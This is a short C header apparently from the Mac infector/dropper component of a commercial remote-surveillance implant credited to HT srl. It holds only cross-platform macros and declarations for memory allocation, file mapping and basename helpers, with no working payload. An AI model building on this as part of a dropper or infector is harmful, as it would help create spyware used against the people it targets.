/*
 * RCSMacDropperUtil.h 
 *
 * Created by Alfredo 'revenge' Pesoli on 20/07/2009.
 * Win32 porting by Massimo Chiodini on 02/11/2009
 *
 * Copyright (C) HT srl 2009. All rights reserved
 *
 */
#ifdef WIN32
#pragma once
#include <Windows.h>
#define mmap _mmap
#endif

#include "RCSMacInfectorErrors.h"
#include "RCSMacCommon.h"

#ifdef WIN32
typedef HANDLE _mHandle;
#else
typedef int _mHandle;
#endif

#ifdef WIN32
#define DIR_SEPARATOR '\\'
#define DIR_SEPARATOR_2 '\\\\'
#define DIR_SEPARATOR_3 '/'
#endif

#define IS_DIR_SEPARATOR(ch) \
  (((ch) == DIR_SEPARATOR) || ((ch) == DIR_SEPARATOR_2) || ((ch) == DIR_SEPARATOR_3))

void *allocate (_mSize_t);
char *mapFile (char *, int *, _mHandle *, _mHandle *, int *);
char *basename (const char *);